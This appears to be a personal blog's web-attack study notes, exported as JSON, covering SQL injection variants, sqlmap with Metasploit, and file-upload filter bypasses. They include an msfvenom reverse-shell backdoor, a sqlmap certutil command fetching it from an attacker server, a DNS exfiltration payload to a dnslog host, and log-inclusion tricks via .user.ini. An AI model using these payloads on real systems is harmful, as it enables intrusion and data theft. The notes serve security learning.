{"title":"WEB攻防-通用漏洞","uid":"11932efbcdc3039b003ba34e280dee13","slug":"WEB攻防-通用漏洞","date":"2024-03-05T15:07:08.000Z","updated":"2024-03-10T07:47:05.876Z","comments":true,"path":"api/articles/WEB攻防-通用漏洞.json","keywords":null,"cover":null,"content":"<h2 id=\"SQL注入-补充内容\"><a href=\"#SQL注入-补充内容\" class=\"headerlink\" title=\"SQL注入-补充内容\"></a>SQL注入-补充内容</h2><h3 id=\"ACCESS注入\"><a href=\"#ACCESS注入\" class=\"headerlink\" title=\"ACCESS注入\"></a>ACCESS注入</h3><h4 id=\"偏移注入\"><a href=\"#偏移注入\" class=\"headerlink\" title=\"偏移注入\"></a>偏移注入</h4><h5 id=\"使用场景\"><a href=\"#使用场景\" class=\"headerlink\" title=\"使用场景\"></a>使用场景</h5><ul>\n<li>知道表名</li>\n<li>不知道列名</li>\n<li>列名特殊, 无法爆破</li>\n</ul>\n<h5 id=\"注入原理\"><a href=\"#注入原理\" class=\"headerlink\" title=\"注入原理\"></a>注入原理</h5><ul>\n<li><p>假设一个表有8个字段，admin表有3个字段。(需要先判断列数)</p>\n</li>\n<li><p>联合查询payload：union select 1,2,3,4,5,6,7,8 from admin </p>\n</li>\n<li><p>在我们不知道admin有多少字段的情况下可以尝试payload：union select 1,2,3,4,5,6,7,admin.* from admin，此时页面出错</p>\n</li>\n<li><p>直到payload：union select 1,2,3,4,5,admin.* from admin时页面返回正常，说明admin表有三个字段</p>\n</li>\n<li><p>然后通过移动admin.*的位置，就可以回显不同的数据</p>\n</li>\n</ul>\n<h3 id=\"MYSQL\"><a href=\"#MYSQL\" class=\"headerlink\" title=\"MYSQL\"></a>MYSQL</h3><ul>\n<li><p>读取文件</p>\n<div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">select load_file(&#39;D:/a.txt&#39;);</span></span></code></pre></div></li>\n<li><p>写入文件</p>\n<div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">select &#39;xxxx&#39; into outfile &#39;D:/a.txt&#39;;</span></span></code></pre></div></li>\n</ul>\n<h3 id=\"sqlmap\"><a href=\"#sqlmap\" class=\"headerlink\" title=\"sqlmap\"></a>sqlmap</h3><ul>\n<li><a href=\"https://www.cnblogs.com/bmjoker/p/9326258.html\">1. sqlmap超详细笔记+思维导图 - bmjoker - 博客园 (cnblogs.com)</a></li>\n</ul>\n<h4 id=\"sqlmap联动msf\"><a href=\"#sqlmap联动msf\" class=\"headerlink\" title=\"sqlmap联动msf\"></a>sqlmap联动msf</h4><ul>\n<li><p>攻击者服务器msf生成后门</p>\n<div class=\"language-bash\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">bash</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #FFCB6B\">msfvenom</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">-p</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">windows/meterpreter/reverse_http</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">lhost=服务器地址</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">lport=端口</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">-f</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">exe</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">-o</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">sql.exe</span></span></code></pre></div></li>\n<li><p>开启监听：</p>\n<div class=\"language-bash\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">bash</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #FFCB6B\">msf6&gt;</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">use</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">exploit/multi/handler</span></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">msf6&gt;</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">set</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">lhost</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">0.0</span><span style=\"color: #C3E88D\">.0.0</span></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">msf6&gt;</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">set</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">lport</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">6666</span></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">msf6&gt;</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">run</span></span></code></pre></div></li>\n<li><p>sqlmap实现访问下载后门文件</p>\n<div class=\"language-bash\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">bash</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #FFCB6B\">python</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">sqlmap.py</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">-u</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #C3E88D\">url</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">--os-cmd=</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #C3E88D\">certutil -urlcache -split -f http://xxxx/sql.exe c:/sql.exe</span><span style=\"color: #89DDFF\">&quot;</span></span></code></pre></div></li>\n</ul>\n<h4 id=\"脚本使用\"><a href=\"#脚本使用\" class=\"headerlink\" title=\"脚本使用\"></a>脚本使用</h4><p>工具无法自动判断加密&#x2F;编码类型和数据格式(如json), 需要手工注入进行判断</p>\n<ul>\n<li>例如, 用base64编码payload:<div class=\"language-bash\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">bash</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #FFCB6B\">python</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">sqlmap.py</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">-u</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #C3E88D\">url</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">--tamper=base64encode.py</span></span></code></pre></div></li>\n</ul>\n<h4 id=\"基于堆叠注入-绕过select过滤\"><a href=\"#基于堆叠注入-绕过select过滤\" class=\"headerlink\" title=\"(基于堆叠注入)绕过select过滤\"></a>(基于堆叠注入)绕过select过滤</h4><p><a href=\"https://www.cnblogs.com/cmredkulaa/p/14563311.html\">几种绕过select过滤的姿势 - 2hangG3 - 博客园 (cnblogs.com)</a></p>\n<ul>\n<li><p>原语句:</p>\n<div class=\"language-sql\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">sql</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #F78C6C\">1</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">;select flag from `1919810931114514`;</span></span></code></pre></div></li>\n<li><p>由于<code>return preg_match(&quot;/select|update|delete|drop|insert|where|\\./i&quot;,$inject);</code>select被过滤</p>\n</li>\n<li><p>改为:</p>\n<div class=\"language-sql\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">sql</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #F78C6C\">1</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">;set @sql = CONCAT(</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #BABED8\">se</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">,</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #BABED8\">lect </span><span style=\"color: #89DDFF\">*</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">from</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">`</span><span style=\"color: #C3E88D\">1919810931114514</span><span style=\"color: #89DDFF\">`</span><span style=\"color: #BABED8\">;</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">);prepare stmt from @sql;EXECUTE stmt;</span></span></code></pre></div></li>\n<li><p>解析:</p>\n<ul>\n<li><div class=\"language-sql\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">sql</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #F78C6C\">sEt</span><span style=\"color: #BABED8\"> @sql </span><span style=\"color: #89DDFF\">=</span><span style=\"color: #BABED8\"> </span><span style=\"color: #82AAFF\">CONCAT</span><span style=\"color: #BABED8\">(</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">se</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #BABED8\">,</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">lect * from `1919810931114514`;</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #BABED8\">);</span></span></code></pre></div><ul>\n<li><code>set</code>用于设置变量名和值</li>\n<li><code>CONCAT</code><strong>拼接语句, 绕过过滤</strong></li>\n</ul>\n</li>\n<li><div class=\"language-sql\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">sql</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #BABED8\">prepare stmt </span><span style=\"color: #F78C6C\">from</span><span style=\"color: #BABED8\"> @sql;</span></span></code></pre></div><p><code>prepare</code>用于预备一个语句，并赋予名称，以后可以引用该语句</p>\n</li>\n<li><div class=\"language-sql\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">sql</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"></span></code></pre></div></li>\n</ul>\n<p>  EXECUTE stmt;</p>\n<div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\"></span></span>\n<span class=\"line\"><span style=\"color: #babed8\">`execute`执行语句</span></span></code></pre></div></li>\n</ul>\n<h3 id=\"二次注入\"><a href=\"#二次注入\" class=\"headerlink\" title=\"二次注入\"></a>二次注入</h3><h5 id=\"原理\"><a href=\"#原理\" class=\"headerlink\" title=\"原理\"></a>原理</h5><ul>\n<li>普通注入: 数据直接进入到 SQL 查询中</li>\n<li>二次注入: 输入数据经处理后<strong>存储</strong>, 取出后, <strong>再次</strong>进入到 SQL 查询</li>\n</ul>\n<h5 id=\"过程\"><a href=\"#过程\" class=\"headerlink\" title=\"过程\"></a>过程</h5><ul>\n<li>插入<code>1‘#</code></li>\n<li>被转义成<code>1\\’#</code></li>\n<li>不能注入，但是<strong>保存在数据库</strong>时变成了原来的<code>1’#</code></li>\n<li>利用<code>1’#</code>进行注入,这里利用时要求取出数据时不转义</li>\n</ul>\n<h5 id=\"案例\"><a href=\"#案例\" class=\"headerlink\" title=\"案例\"></a>案例</h5><p><a href=\"https://buuoj.cn/challenges#[%E7%BD%91%E9%BC%8E%E6%9D%AF2018]Unfinish\">网鼎杯2018-Unfinish</a></p>\n<ul>\n<li>注册时在<code>username</code>注入sql语句</li>\n<li>此时数据被转义, <strong>无法注入</strong></li>\n<li>利用邮箱登录后重新加载<code>username</code>, 此时没有转义, 注入语句成功执行</li>\n</ul>\n<h3 id=\"DNS注入\"><a href=\"#DNS注入\" class=\"headerlink\" title=\"DNS注入\"></a>DNS注入</h3><ul>\n<li>DNS协议：将域名转化为IP 日志 &#x3D;&gt; 记录了域名转化IP请求</li>\n</ul>\n<p><em><strong>DNS注入的核心，将盲注转化为显错注入</strong></em></p>\n<ul>\n<li>payload例子:</li>\n</ul>\n<div class=\"language-sql\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">sql</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #F78C6C\">select</span><span style=\"color: #BABED8\"> load_file(</span><span style=\"color: #82AAFF\">concat</span><span style=\"color: #BABED8\">(</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">//</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #BABED8\">,(</span><span style=\"color: #F78C6C\">select</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">database</span><span style=\"color: #89DDFF\">()</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">limit</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">0</span><span style=\"color: #BABED8\">,</span><span style=\"color: #F78C6C\">1</span><span style=\"color: #BABED8\">),</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">.81k8pu.dnslog.cn/abc</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #BABED8\">));</span></span></code></pre></div><h2 id=\"文件上传\"><a href=\"#文件上传\" class=\"headerlink\" title=\"文件上传\"></a>文件上传</h2><h3 id=\"解析执行\"><a href=\"#解析执行\" class=\"headerlink\" title=\"解析执行\"></a>解析执行</h3><h4 id=\"user-ini\"><a href=\"#user-ini\" class=\"headerlink\" title=\".user.ini\"></a>.user.ini</h4><ul>\n<li>可以上传一个.user,ini文件, 自定义以php解析特定文件, 例如<div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">auto_prepend_file=test.txt</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">//或者</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">auto_append_file=test.txt</span></span></code></pre></div></li>\n</ul>\n<h4 id=\"htaccess\"><a href=\"#htaccess\" class=\"headerlink\" title=\".htaccess\"></a>.htaccess</h4><h3 id=\"过滤绕过\"><a href=\"#过滤绕过\" class=\"headerlink\" title=\"过滤绕过\"></a>过滤绕过</h3><h4 id=\"绕过过滤\"><a href=\"#绕过过滤\" class=\"headerlink\" title=\"绕过&lt;?php?&gt;过滤\"></a>绕过&lt;?php?&gt;过滤</h4><ul>\n<li><code>&lt;?   ?&gt;</code>需要开启短标签开关，short_open_tag</li>\n<li><code>&lt;?= ?&gt;</code>PHP版本&gt;PHP 5.4.0</li>\n<li><code>&lt;% %&gt;</code>asp_tags设成On</li>\n<li><code>&lt;script language=&quot;php&quot;&gt;&lt;/script&gt;</code>php7之后就不能用了</li>\n</ul>\n<h4 id=\"利用反引号-绕过\"><a href=\"#利用反引号-绕过\" class=\"headerlink\" title=\"利用反引号&#96;&#96;绕过\"></a>利用反引号&#96;&#96;绕过</h4><ul>\n<li>反引号运算符”&#96;”相当于 “shell_exec() “函数, 将里面的内容作为shell命令来执行</li>\n</ul>\n<h3 id=\"包含日志\"><a href=\"#包含日志\" class=\"headerlink\" title=\"包含日志\"></a>包含日志</h3><ul>\n<li><p>将后门代码写入UA头中</p>\n</li>\n<li><p>写入.user.ini配置文件，将日志文件内容通过文件包含访问</p>\n</li>\n<li><p>例如:</p>\n<div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">user.ini:auto_prepend_file-test.png</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">test.png:&lt;?=include&quot;/var/lo&quot;.&quot;g/nginx/access.lo&quot;.&quot;g&quot;?&gt;</span></span></code></pre></div></li>\n</ul>\n<h3 id=\"文件头检测\"><a href=\"#文件头检测\" class=\"headerlink\" title=\"文件头检测\"></a>文件头检测</h3><ul>\n<li><p>文件头部检测是否为图片格式文件, 如图像会检测头部是否为<code>GIF89a</code></p>\n</li>\n<li><h2 id=\"可在文件头部添加该特征绕过检测-例如-user-ini-GIF89Aauto-prepend-file-test-png\"><a href=\"#可在文件头部添加该特征绕过检测-例如-user-ini-GIF89Aauto-prepend-file-test-png\" class=\"headerlink\" title=\"可在文件头部添加该特征绕过检测, 例如&#96;&#96;&#96;user ini:GIF89Aauto_prepend_file&#x3D;test.png\"></a>可在文件头部添加该特征绕过检测, 例如<br>&#96;&#96;&#96;<br>user ini:<br>GIF89A<br>auto_prepend_file&#x3D;test.png</h2><p>test.png:<br>GIF89A</p>\n<?=include\"/var/lo\".\"g/nginx/access.lo\".\"g\"?>\n</li>\n<li><p><a href=\"https://www.cnblogs.com/WangAoBo/p/6366211.html\">常见文件的文件头标志 - M4x - 博客园 (cnblogs.com)</a></p>\n</li>\n</ul>\n","feature":true,"text":"SQL注入-补充内容ACCESS注入偏移注入使用场景 知道表名 不知道列名 列名特殊, 无法爆破 注入原理 假设一个表有8个字段，admin表有3个字段。(需要...","permalink":"/post/WEB攻防-通用漏洞","photos":[],"count_time":{"symbolsCount":"2.7k","symbolsTime":"2 mins."},"categories":[],"tags":[],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#SQL%E6%B3%A8%E5%85%A5-%E8%A1%A5%E5%85%85%E5%86%85%E5%AE%B9\"><span class=\"toc-text\">SQL注入-补充内容</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#ACCESS%E6%B3%A8%E5%85%A5\"><span class=\"toc-text\">ACCESS注入</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E5%81%8F%E7%A7%BB%E6%B3%A8%E5%85%A5\"><span class=\"toc-text\">偏移注入</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E4%BD%BF%E7%94%A8%E5%9C%BA%E6%99%AF\"><span class=\"toc-text\">使用场景</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86\"><span class=\"toc-text\">注入原理</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#MYSQL\"><span class=\"toc-text\">MYSQL</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#sqlmap\"><span class=\"toc-text\">sqlmap</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#sqlmap%E8%81%94%E5%8A%A8msf\"><span class=\"toc-text\">sqlmap联动msf</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E8%84%9A%E6%9C%AC%E4%BD%BF%E7%94%A8\"><span class=\"toc-text\">脚本使用</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E5%9F%BA%E4%BA%8E%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5-%E7%BB%95%E8%BF%87select%E8%BF%87%E6%BB%A4\"><span class=\"toc-text\">(基于堆叠注入)绕过select过滤</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5\"><span class=\"toc-text\">二次注入</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E5%8E%9F%E7%90%86\"><span class=\"toc-text\">原理</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E8%BF%87%E7%A8%8B\"><span class=\"toc-text\">过程</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E6%A1%88%E4%BE%8B\"><span class=\"toc-text\">案例</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#DNS%E6%B3%A8%E5%85%A5\"><span class=\"toc-text\">DNS注入</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0\"><span class=\"toc-text\">文件上传</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E8%A7%A3%E6%9E%90%E6%89%A7%E8%A1%8C\"><span class=\"toc-text\">解析执行</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#user-ini\"><span class=\"toc-text\">.user.ini</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#htaccess\"><span class=\"toc-text\">.htaccess</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87\"><span class=\"toc-text\">过滤绕过</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4\"><span class=\"toc-text\">绕过&lt;?php?&gt;过滤</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E5%88%A9%E7%94%A8%E5%8F%8D%E5%BC%95%E5%8F%B7-%E7%BB%95%E8%BF%87\"><span class=\"toc-text\">利用反引号&#96;&#96;绕过</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%8C%85%E5%90%AB%E6%97%A5%E5%BF%97\"><span class=\"toc-text\">包含日志</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%96%87%E4%BB%B6%E5%A4%B4%E6%A3%80%E6%B5%8B\"><span class=\"toc-text\">文件头检测</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%8F%AF%E5%9C%A8%E6%96%87%E4%BB%B6%E5%A4%B4%E9%83%A8%E6%B7%BB%E5%8A%A0%E8%AF%A5%E7%89%B9%E5%BE%81%E7%BB%95%E8%BF%87%E6%A3%80%E6%B5%8B-%E4%BE%8B%E5%A6%82-user-ini-GIF89Aauto-prepend-file-test-png\"><span class=\"toc-text\">可在文件头部添加该特征绕过检测, 例如&#96;&#96;&#96;user ini:GIF89Aauto_prepend_file&#x3D;test.png</span></a></li></ol>","author":{"name":"Myprefer","slug":"blog-author","avatar":"https://i0.imgs.ovh/2024/01/23/x3DH5.jpeg","link":"https://myprefer.github.io/","description":"An ordinary learner","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"hidden":false,"prev_post":{"title":"(转)知识点合集","uid":"7877f5fab13c4afbf71848ed5da71412","slug":"转-知识点合集","date":"2024-03-10T09:36:01.000Z","updated":"2024-03-10T09:36:56.712Z","comments":true,"path":"api/articles/转-知识点合集.json","keywords":null,"cover":[],"text":" Author: Evi1cg Blog: https://evi1cg.github.io 信息搜集开源情报信息收集（OSINT）github Github_...","permalink":"/post/转-知识点合集","photos":[],"count_time":{"symbolsCount":"39k","symbolsTime":"35 mins."},"categories":[],"tags":[],"author":{"name":"Myprefer","slug":"blog-author","avatar":"https://i0.imgs.ovh/2024/01/23/x3DH5.jpeg","link":"https://myprefer.github.io/","description":"An ordinary learner","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"feature":true},"next_post":{"title":"WEB攻防-特性漏洞","uid":"b69c40d42a331389a30f55c12f4711cf","slug":"WEB攻防-特性漏洞","date":"2024-03-03T06:48:26.000Z","updated":"2024-03-05T15:55:59.512Z","comments":true,"path":"api/articles/WEB攻防-特性漏洞.json","keywords":null,"cover":[],"text":"ASP安全 常用组合: windows+IIS+ASP+Access(sql server) 安全问题:MDB默认下载 access数据库文件后缀名一般为asp...","permalink":"/post/WEB攻防-特性漏洞","photos":[],"count_time":{"symbolsCount":"5.3k","symbolsTime":"5 mins."},"categories":[],"tags":[{"name":"网络安全","slug":"网络安全","count":20,"path":"api/tags/网络安全.json"},{"name":"学习日志","slug":"学习日志","count":20,"path":"api/tags/学习日志.json"},{"name":"小迪安全","slug":"小迪安全","count":8,"path":"api/tags/小迪安全.json"},{"name":"WEB攻防","slug":"WEB攻防","count":3,"path":"api/tags/WEB攻防.json"}],"author":{"name":"Myprefer","slug":"blog-author","avatar":"https://i0.imgs.ovh/2024/01/23/x3DH5.jpeg","link":"https://myprefer.github.io/","description":"An ordinary learner","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"feature":true}}